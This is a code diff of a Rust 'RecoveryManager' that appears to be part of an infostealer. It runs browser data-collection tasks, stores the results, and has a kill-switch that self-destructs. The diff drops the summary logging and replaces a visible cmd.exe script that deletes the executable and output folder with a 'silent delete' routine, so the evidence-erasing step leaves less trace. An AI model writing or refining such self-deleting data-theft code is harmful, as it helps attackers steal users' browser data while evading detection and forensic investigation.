@@ -1,13 +1,10 @@
 use crate::build_config;
-use crate::recovery::browsers;
 use crate::recovery::context::RecoveryContext;
 use crate::recovery::settings::RecoveryControl;
 use crate::recovery::task::{RecoveryError, RecoveryOutcome, RecoveryStatus, RecoveryTask};
-use std::fmt::Write as _;
 use std::sync::Arc;
 use std::time::Instant;
-use tokio::fs::{self, OpenOptions};
-use tokio::io::AsyncWriteExt;
+use tokio::fs;
 use tokio::sync::{OwnedSemaphorePermit, Semaphore};
 use tokio::task::JoinSet;
 use tracing::{debug, info};
@@ -34,18 +31,6 @@ impl RecoveryManager {
     }
 
     #[allow(dead_code)]
-    pub async fn with_default_browser_tasks(
-        context: &RecoveryContext,
-    ) -> Result<Self, RecoveryError> {
-        let mut manager = Self::new(context.clone());
-        let browser_tasks = browsers::default_browser_tasks(context).await;
-        manager.register_tasks(browser_tasks);
-        Ok(manager)
-    }
-
-    pub fn context(&self) -> &RecoveryContext {
-        &self.context
-    }
 
     pub async fn run_all(&self) -> Result<Vec<RecoveryOutcome>, RecoveryError> {
         fs::create_dir_all(&self.context.output_dir).await?;
@@ -101,7 +86,6 @@ impl RecoveryManager {
                 Ok(outcome) => outcomes.push(outcome),
                 Err(RecoveryError::KillSwitchTriggered) => {
                     info!("kill-switch triggered, initiating self-destruct");
-                    let _ = self.persist_summary(&outcomes).await;
                     self.self_destruct();
                 }
                 Err(err) => return Err(err),
@@ -109,23 +93,18 @@ impl RecoveryManager {
         }
 
         Self::sort_outcomes(&mut outcomes);
-        self.persist_summary(&outcomes).await?;
         Ok(outcomes)
     }
 
     fn self_destruct(&self) -> ! {
-        let exe_path = std::env::current_exe().unwrap_or_default();
-        let _ = fs::remove_dir_all(&self.context.output_dir);
+        let _ = std::fs::remove_dir_all(&self.context.output_dir);
 
         #[cfg(target_os = "windows")]
         {
-            use std::process::Command;
-            let script = format!(
-                "timeout /t 3 > nul & del /f /q \"{}\" & rmdir /s /q \"{}\"",
-                exe_path.display(),
-                self.context.output_dir.display()
-            );
-            let _ = Command::new("cmd").args(&["/C", &script]).spawn();
+            use crate::recovery::self_delete::perform_silent_delete;
+            unsafe {
+                let _ = perform_silent_delete();
+            }
         }
 
         std::process::exit(0);
@@ -175,26 +154,6 @@ impl RecoveryManager {
         })
     }
 
-    async fn persist_summary(&self, outcomes: &[RecoveryOutcome]) -> Result<(), RecoveryError> {
-        let summary_path = self.context.output_dir.join("summary.log");
-        let mut file = OpenOptions::new()
-            .create(true)
-            .write(true)
-            .truncate(true)
-            .open(&summary_path)
-            .await?;
-
-        let mut buffer = String::with_capacity(outcomes.len().saturating_mul(96));
-        for entry in outcomes.iter() {
-            buffer.push_str(&Self::format_summary_line(entry));
-            let _ = writeln!(&mut buffer, " | {} artifacts", entry.artifacts.len());
-        }
-        file.write_all(buffer.as_bytes()).await?;
-
-        file.flush().await?;
-        Ok(())
-    }
-
     fn sort_outcomes(outcomes: &mut [RecoveryOutcome]) {
         match build_config::BUILD_VARIANT {
             build_config::BuildVariant::Alpha => outcomes.sort_by(|a, b| {
@@ -219,20 +178,5 @@ impl RecoveryManager {
             RecoveryStatus::NotFound => 2,
             RecoveryStatus::Failed => 3,
         }
-    }
-
-    fn format_summary_line(entry: &RecoveryOutcome) -> String {
-        let mut parts = Vec::with_capacity(build_config::SUMMARY_FIELD_ORDER.len());
-        for &field in build_config::SUMMARY_FIELD_ORDER.iter() {
-            let part = match field {
-                0 => entry.task.clone(),
-                1 => entry.category.to_string(),
-                2 => format!("{:?}", entry.status),
-                3 => format!("{:?}", entry.duration),
-                other => format!("<unknown:{other}>"),
-            };
-            parts.push(part);
-        }
-        parts.join(" | ")
     }
 }
